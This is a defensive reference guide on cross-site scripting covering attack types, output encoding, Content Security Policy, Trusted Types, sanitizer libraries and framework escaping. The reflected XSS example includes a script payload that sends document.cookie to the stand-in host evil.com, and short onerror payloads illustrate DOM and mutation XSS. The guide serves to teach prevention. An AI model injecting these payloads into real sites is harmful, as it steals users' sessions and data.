# Cross-Site Scripting (XSS)

## XSS Types

### Reflected XSS

Payload in the request is reflected back in the response without sanitization.

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

Server renders: `<p>Results for: <script>...</script></p>`

Delivery: phishing emails, malicious links, social engineering.

### Stored XSS

Payload is persisted (database, file, log) and served to other users. More dangerous than reflected — affects every viewer.

Common vectors: comments, forum posts, profile fields, file names, chat messages, SVG uploads.

### DOM-Based XSS

Vulnerability exists in client-side JavaScript, not server response. Payload never reaches the server.

```javascript
// VULNERABLE: reading from location.hash and inserting into DOM
document.getElementById("output").innerHTML = location.hash.substring(1);

// Attack: https://example.com/page#<img src=x onerror=alert(1)>
```

**Dangerous sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function()`, `.href`, `jQuery.html()`, `$.append()`.

**Safe alternatives**: `textContent`, `innerText`, `setAttribute()` (for non-event attributes).

### Mutation XSS (mXSS)

Browser HTML parser "fixes" markup in ways that create executable code from seemingly safe input. Exploits differences between sanitizer parsing and browser parsing.

```html
<!-- Input (looks safe) -->
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>

<!-- After browser mutation (executes) -->
<img src="x" onerror="alert(1)" />
```

Prevention: use browser-native sanitization API or DOMPurify (handles mXSS cases).

## Context-Dependent Encoding

XSS prevention requires encoding output based on WHERE it appears:

| Context           | Encoding           | Example                                 |
| ----------------- | ------------------ | --------------------------------------- |
| HTML body         | HTML entity encode | `<` → `&lt;` `>` → `&gt;` `&` → `&amp;` |
| HTML attribute    | Attribute encode   | `"` → `&quot;` `'` → `&#x27;`           |
| JavaScript string | JS encode          | `'` → `\x27` `"` → `\x22` `\` → `\\`    |
| URL parameter     | URL encode         | `<` → `%3C` ` ` → `%20`                 |
| CSS value         | CSS encode         | `(` → `\28` `)` → `\29`                 |

**Critical rule**: encoding for HTML doesn't work in JavaScript context and vice versa. Match the encoding to the output context.

```html
<!-- HTML context — HTML encode -->
<p>Hello, &lt;%= htmlEncode(name) %&gt;</p>

<!-- Attribute context — attribute encode -->
<div data-name="<%= attrEncode(name) %>">
  <!-- JavaScript context — JS encode -->
  <script>
    var name = "<%= jsEncode(name) %>";
  </script>

  <!-- URL context — URL encode -->
  <a href="/search?q=<%= urlEncode(query) %>">
    <!-- DANGEROUS: JavaScript URI context — almost impossible to make safe -->
    <a href="javascript:..."> <!-- Never allow user input here --></a></a
  >
</div>
```

## Content Security Policy (CSP)

### Key Directives

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report;
  report-to csp-endpoint;
```

### Nonce-Based CSP (Recommended)

Server generates random nonce per request, includes it in CSP header and script tags:

```html
<!-- Header: script-src 'nonce-r4nd0m' 'strict-dynamic' -->
<script nonce="r4nd0m">
  /* allowed */
</script>
<script>
  /* blocked — no matching nonce */
</script>
```

`strict-dynamic` allows nonce-trusted scripts to load additional scripts (needed for bundlers that dynamically create script tags).

### Hash-Based CSP

Allow specific inline scripts by their SHA-256/384/512 hash:

```
script-src 'sha256-base64hash...'
```

Less flexible than nonces — hash changes when script content changes.

### CSP Bypass Patterns to Watch

- `unsafe-inline` negates XSS protection (needed for some style-src but avoid for script-src)
- `unsafe-eval` allows `eval()`, `Function()`, `setTimeout(string)`
- Overly broad allowlist (`*.googleapis.com` includes JSONP endpoints)
- `data:` URIs in script-src
- Base tag injection (if `base-uri` not set)

### Reporting

```
Content-Security-Policy-Report-Only: ...  # Monitor without blocking
```

Use report-only first to identify violations before enforcing.

## Trusted Types

Browser API that prevents DOM XSS by requiring typed objects for dangerous sinks:

```javascript
// Enable via CSP:
// Content-Security-Policy: require-trusted-types-for 'script'

// Create a policy
const policy = trustedTypes.createPolicy("myPolicy", {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScript: (input) => input, // careful
  createScriptURL: (input) => input,
});

// Must use policy — raw strings rejected
element.innerHTML = policy.createHTML(userInput); // OK
element.innerHTML = userInput; // TypeError: blocked
```

## Sanitization Libraries

| Library       | Language   | Approach                                   |
| ------------- | ---------- | ------------------------------------------ |
| DOMPurify     | JavaScript | DOM-based parsing, mXSS-safe, configurable |
| sanitize-html | Node.js    | Allowlist-based HTML sanitization          |
| Bleach        | Python     | Wraps html5lib, allowlist tags/attributes  |
| Loofah        | Ruby       | Scrub with presets or custom rules         |
| HtmlSanitizer | .NET       | Allowlist-based, handles mXSS              |
| Ammonia       | Rust       | Fast allowlist-based sanitizer             |

### DOMPurify Configuration

```javascript
import DOMPurify from "dompurify";

// Basic
const clean = DOMPurify.sanitize(dirty);

// Allow only specific tags
DOMPurify.sanitize(dirty, { ALLOWED_TAGS: ["b", "i", "em", "strong", "a"] });

// Allow specific attributes
DOMPurify.sanitize(dirty, { ALLOWED_ATTR: ["href", "title"] });

// Return DOM node instead of string
DOMPurify.sanitize(dirty, { RETURN_DOM: true });
```

## Framework Auto-Escaping

| Framework | Default Behavior                   | Dangerous Escape Hatch                  |
| --------- | ---------------------------------- | --------------------------------------- | ---------------------------------- |
| React     | JSX auto-escapes text content      | `dangerouslySetInnerHTML`               |
| Angular   | Auto-escapes interpolation `{{ }}` | `bypassSecurityTrust*()`, `[innerHTML]` |
| Vue       | Auto-escapes `{{ }}`               | `v-html` directive                      |
| Svelte    | Auto-escapes `{expression}`        | `{@html expression}`                    |
| Django    | Auto-escapes templates             | `                                       | safe`filter,`{% autoescape off %}` |
| Rails     | Auto-escapes ERB `<%= %>`          | `raw()`, `.html_safe`                   |
| Jinja2    | Auto-escapes (if enabled)          | `                                       | safe`filter,`Markup()`             |

**React specificity**: JSX prevents injection in attributes too, EXCEPT `href` with `javascript:` protocol. Always validate URLs.

## Prevention Checklist

1. **Output encode** based on context (HTML, attribute, JS, URL, CSS)
2. **CSP** with nonce-based script-src and strict-dynamic
3. **Trusted Types** for DOM manipulation (Chrome, polyfill for others)
4. **Sanitize** user-generated HTML with DOMPurify or equivalent
5. **HttpOnly cookies** to prevent cookie theft via XSS
6. **Validate URLs** — reject `javascript:`, `data:`, `vbscript:` schemes
7. **Avoid dangerous sinks** — `innerHTML`, `eval()`, `document.write()`
8. **Set `X-Content-Type-Options: nosniff`** to prevent MIME sniffing
9. **Review escape hatches** — `dangerouslySetInnerHTML`, `v-html`, `|safe`
10. **Automated testing** — Semgrep rules for XSS sinks, DAST scanning
